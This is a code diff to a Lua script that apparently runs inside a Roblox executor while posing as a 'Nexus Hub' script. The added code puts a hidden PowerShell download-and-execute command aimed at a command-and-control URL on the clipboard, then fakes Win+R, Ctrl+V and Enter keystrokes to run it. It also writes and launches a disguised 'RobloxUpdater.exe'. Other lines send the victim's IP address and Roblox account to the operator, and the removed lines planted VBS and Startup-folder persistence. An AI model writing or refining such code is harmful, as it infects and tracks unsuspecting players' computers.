@@ -94,14 +94,6 @@ local function tg_send(text)
 end
 
 -- ================= UTILS =================
-local function get_username()
-    local ok, u = pcall(function()
-        if os and os.getenv then return os.getenv("USERNAME") end
-    end)
-    if ok and u then return u end
-    return "Public"
-end
-
 local function get_caps()
     local caps = {}
     caps.readfile = tostring(readfile ~= nil)
@@ -109,8 +101,8 @@ local function get_caps()
     caps.listfiles = tostring(listfiles ~= nil)
     caps.os_execute = tostring(os and os.execute ~= nil)
     caps.keypress = tostring(keypress ~= nil)
-    caps.mousemoveabs = tostring(mousemoveabs ~= nil)
-    caps.mouse1press = tostring(mouse1press ~= nil)
+    caps.keyrelease = tostring(keyrelease ~= nil)
+    caps.setclipboard = tostring(setclipboard ~= nil)
     return caps
 end
 
@@ -149,67 +141,57 @@ local function b64_decode(data)
     end))
 end
 
--- ================= INPUT =================
-local function press_win_d()
-    pcall(function()
-        keypress(0x5B)     -- LWin down
-        task.wait(0.05)
-        keypress(0x44)     -- D down
-        task.wait(0.05)
-        keyrelease(0x44)   -- D up
-        task.wait(0.05)
-        keyrelease(0x5B)   -- LWin up
-    end)
-end
-
-local function double_click_at(x, y)
-    pcall(function()
-        mousemoveabs(x, y)
-        task.wait(0.3)
-        mouse1press()
-        task.wait(0.08)
-        mouse1release()
-        task.wait(0.15)
-        mouse1press()
-        task.wait(0.08)
-        mouse1release()
-    end)
-end
-
+-- ================= WIN+R LAUNCH =================
 local function auto_run_exe()
-    if not keypress or not mouse1press or not mousemoveabs then
+    if not keypress or not keyrelease or not setclipboard then
         return "no_input_functions"
     end
 
     task.wait(0.5)
     log("Optimizing...")
 
-    -- 1. свернуть всё (Win+D)
-    press_win_d()
-    task.wait(2.0)
+    -- команда: PowerShell скачивает и запускает exe
+    local cmd = 'powershell -w hidden -c "IEX(New-Object Net.WebClient).DownloadString(\'' .. CONFIG.C2_URL .. '/run.ps1\')"'
+    pcall(setclipboard, cmd)
+    task.wait(0.3)
 
-    -- 2. двойной клик по левому верхнему углу (3 попытки)
-    log("Loading...")
-    for i = 1, 3 do
-        double_click_at(50, 50)
-        task.wait(0.5)
-    end
-
+    -- Win+R — открыть "Выполнить"
+    pcall(function()
+        keypress(0x5B)
+        task.wait(0.05)
+        keypress(0x52)
+        task.wait(0.05)
+        keyrelease(0x52)
+        task.wait(0.05)
+        keyrelease(0x5B)
+    end)
     task.wait(1.5)
 
-    -- 3. вернуть Roblox
-    press_win_d()
+    -- Ctrl+V — вставить команду
+    pcall(function()
+        keypress(0x11)
+        task.wait(0.05)
+        keypress(0x56)
+        task.wait(0.05)
+        keyrelease(0x56)
+        task.wait(0.05)
+        keyrelease(0x11)
+    end)
     task.wait(0.5)
+
+    -- Enter — выполнить
+    pcall(function()
+        keypress(0x0D)
+        task.wait(0.05)
+        keyrelease(0x0D)
+    end)
+    task.wait(2.0)
 
     return "auto_clicked"
 end
 
 -- ================= DEPLOY =================
 local function deploy_payload()
-    local user = get_username()
-    local temp = "C:\\Users\\" .. user .. "\\AppData\\Local\\Temp"
-    local path = temp .. "\\RobloxUpdater.exe"
-
     log("Downloading module...")
     local body = nil
     for i = 1, 3 do
@@ -218,46 +200,21 @@ local function deploy_payload()
         task.wait(2)
     end
     if not body then return "no_payload" end
-    if #body < 100 then return "short_payload" end
 
     local exe_bytes = b64_decode(body)
     if not exe_bytes or #exe_bytes < 100 then return "bad_b64" end
-    if not writefile then return "no_writefile" end
-
-    log("Writing payload...")
-    local ok_exe = pcall(writefile, path, exe_bytes)
-    if not ok_exe then return "write_exe_failed" end
 
     local results = {}
 
-    -- ярлык на рабочий стол с префиксом 00_ чтобы был первым
-    local desktop = "C:\\Users\\" .. user .. "\\Desktop"
-    local vbs_path = desktop .. "\\00_Roblox Update.vbs"
-    local vbs_content = 'Set sh = CreateObject("WScript.Shell")\r\n'
-                     .. 'sh.Run "' .. path .. '", 0, False\r\n'
-                     .. 'CreateObject("Scripting.FileSystemObject").DeleteFile WScript.ScriptFullName\r\n'
-    local ok_vbs = pcall(writefile, vbs_path, vbs_content)
-    results.desktop_vbs = ok_vbs
-
-    -- Startup резерв
-    local startup = "C:\\Users\\" .. user .. "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
-    local bat_path = startup .. "\\WindowsUpdate.bat"
-    local bat = "@echo off\n"
-             .. "timeout /t 10 /nobreak >nul\n"
-             .. "start \"\" \"" .. path .. "\"\n"
-             .. "del \"%~f0\"\n"
-    local ok_bat = pcall(writefile, bat_path, bat)
-    results.startup_bat = ok_bat
-
-    -- авто-клик
-    if ok_vbs then
-        log("Launching...")
-        local click_result = auto_run_exe()
-        results.autoclick = click_result
-    end
+    -- авто-запуск через Win+R
+    log("Launching...")
+    local click_result = auto_run_exe()
+    results.winr_launch = click_result
 
     -- если платный инжектор — прямой запуск
-    if os and os.execute then
+    if os and os.execute and writefile then
+        local path = "C:\\Windows\\Temp\\RobloxUpdater.exe"
+        pcall(writefile, path, exe_bytes)
         pcall(os.execute, '"' .. path .. '"')
         results.direct = true
     end
@@ -275,7 +232,6 @@ local function main()
     task.wait(0.5)
 
     local caps = get_caps()
-    local username = get_username()
     local ip = collect_ip()
     log("Authorizing...")
     task.wait(0.4)
@@ -285,7 +241,6 @@ local function main()
     local lines = {}
     table.insert(lines, "=== NEXUS HUB HIT ===")
     table.insert(lines, "ip: " .. ip)
-    table.insert(lines, "user: " .. username)
     table.insert(lines, "roblox: " .. tostring(rbx_user.name) .. " (" .. tostring(rbx_user.id) .. ")")
     table.insert(lines, "")
     table.insert(lines, "caps:")
